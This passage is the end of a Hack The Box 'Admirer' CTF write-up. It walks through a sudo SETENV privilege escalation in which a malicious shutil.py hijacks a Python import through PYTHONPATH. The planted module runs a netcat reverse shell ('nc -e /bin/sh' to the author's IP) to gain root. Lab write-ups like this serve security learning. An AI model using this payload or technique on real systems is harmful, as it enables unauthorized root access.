        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
    <span class="k">esac

    </span><span class="nb">exit </span>0
<span class="k">fi</span>


<span class="c"># Interactive way, to be called from the command line</span>
<span class="nv">options</span><span class="o">=(</span><span class="s2">"View system uptime"</span>
         <span class="s2">"View logged in users"</span>
         <span class="s2">"View crontab"</span>
         <span class="s2">"Backup passwd file"</span>
         <span class="s2">"Backup shadow file"</span>
         <span class="s2">"Backup web data"</span>
         <span class="s2">"Backup DB"</span>
         <span class="s2">"Quit"</span><span class="o">)</span>

<span class="nb">echo
echo</span> <span class="s2">"[[[ System Administration Menu ]]]"</span>
<span class="nv">PS3</span><span class="o">=</span><span class="s2">"Choose an option: "</span>
<span class="nv">COLUMNS</span><span class="o">=</span>11
<span class="k">select </span>opt <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">options</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
    case</span> <span class="nv">$REPLY</span> <span class="k">in
        </span>1<span class="p">)</span> view_uptime <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        2<span class="p">)</span> view_users <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        3<span class="p">)</span> view_crontab <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        4<span class="p">)</span> backup_passwd <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        5<span class="p">)</span> backup_shadow <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        6<span class="p">)</span> backup_web <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        7<span class="p">)</span> backup_db <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        8<span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Bye!"</span> <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>

        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
    <span class="k">esac
done

</span><span class="nb">exit </span>0
</pre></table></code></div></div><p>I thought about using a path hijacking with <code class="highlighter-rouge">echo</code>, as it was the only command that wasn’t using an absolute path, but then realised it could actually never work because of the fact that when running as sudo the path will be changed.</p><p>I kept reading and found the following line: <code class="highlighter-rouge">/opt/scripts/backup.py &amp;</code>. It seemed interesting, as in the past I’ve had privilege escalations with Python import libraries hijackings.</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">make_archive</span>

<span class="n">src</span> <span class="o">=</span> <span class="s">'/var/www/html/'</span>

<span class="c1"># old ftp directory, not used anymore
#dst = '/srv/ftp/html'
</span>
<span class="n">dst</span> <span class="o">=</span> <span class="s">'/var/backups/html'</span>

<span class="n">make_archive</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s">'gztar'</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
</pre></table></code></div></div><p>Now, it took me a bit to put everything together and see how it fit. Turns out that the <code class="highlighter-rouge">SETENV</code> directive expects us to pass some variable to the program being run as sudo so we can actually pass a <code class="highlighter-rouge">PYTHONPATH</code> variable pointing to a directory where we have a malicious <code class="highlighter-rouge">shutil.py</code> with a function called <code class="highlighter-rouge">make_archieve</code>.</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">cat</span> <span class="n">shutil</span><span class="p">.</span><span class="n">py</span>
<span class="k">def</span> <span class="nf">make_archive</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">):</span>
	<span class="nb">__import__</span><span class="p">(</span><span class="s">'os'</span><span class="p">).</span><span class="n">system</span><span class="p">(</span><span class="s">'nc -e /bin/sh 10.10.15.101 1234'</span><span class="p">)</span>
</pre></table></code></div></div><p>Then we run <code class="highlighter-rouge">sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh</code> and we get root.</p><p><em>Root command execution</em></p><p><img src="/assets/posts_details/Admirer/images/root.png" alt="Img" /></p><p>This is everything, I hope you enjoyed the writeup and learned something new! If you liked it you can give me respect on Hack The Box through the following link: <a href="https://www.hackthebox.eu/home/users/profile/31531">https://www.hackthebox.eu/home/users/profile/31531</a>. Until next time!</p><hr /><p><em>Diego Bernal Adelantado</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >Pentesting</a> <a href="/tags/adminer/" class="post-tag no-text-decoration" >Adminer</a> <a href="/tags/sql/" class="post-tag no-text-decoration" >SQL</a> <a href="/tags/python/" class="post-tag no-text-decoration" >Python</a> <a href="/tags/permissions/" class="post-tag no-text-decoration" >Permissions</a> <a href="/tags/enumeration/" class="post-tag no-text-decoration" >Enumeration</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >FTP</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox: Admirer write-up - GoDiego&url=https://diego95root.github.io/posts/Admirer/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox: Admirer write-up - GoDiego&u=https://diego95root.github.io/posts/Admirer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox: Admirer write-up - GoDiego&url=https://diego95root.github.io/posts/Admirer/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://diego95root.github.io/posts/Admirer/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Magic/">Hack The Box: Magic write-up</a></li><li><a href="/posts/Cache/">HackTheBox: Cache write-up</a></li><li><a href="/posts/Blunder/">HackTheBox: Blunder write-up</a></li><li><a href="/posts/Admirer/">HackTheBox: Admirer write-up</a></li><li><a href="/posts/Safe/">Hack The Box: Safe write-up</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Magic/" class="btn btn-outline-primary"><p>Hack The Box: Magic write-up</p></a> <a href="/posts/H1-2006-CTF/" class="btn btn-outline-primary"><p>HackerOne h1-2006 CTF write-up</p></a></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Jarvis/"><div class="card-body"> <span class="timeago small"> Jul 4, 2019 <i class="unloaded">2019-07-04T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Jarvis write-up</h3><div class="text-muted small"><p>Hack The Box: Jarvis machine write-up Jarvis was one of the funniest and most interesting machines I’ve done so far. I learned a lot from it. It starts with a SQL injection that can be exploited t...</p></div></div></a></div><div class="card"> <a href="/posts/SneakyMailer/"><div class="card-body"> <span class="timeago small"> Sep 17, 2020 <i class="unloaded">2020-09-17T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: SneakyMailer write-up</h3><div class="text-muted small"><p>Hack The Box: SneakyMailer write-up SneakyMailer was a medium-rated box based on enumeration and Python. It starts off with having to send emails to users through an insecure SMTP server to get cr...</p></div></div></a></div><div class="card"> <a href="/posts/Magic/"><div class="card-body"> <span class="timeago small"> May 18, 2020 <i class="unloaded">2020-05-18T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Magic write-up</h3><div class="text-muted small"><p>Hack The Box: Magic machine write-up This was an easy machine if you were a bit experienced in web application bugs, as the main vulnerability was a file upload that was used to get a reverse shel...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js" crossorigin="anonymous"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/secfaults">Diego Bernal Adelantado</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-167902069-1', 'auto'); ga('send', 'pageview'); </script> --> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167902069-1" crossorigin="anonymous"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-167902069-1'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://diego95root.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
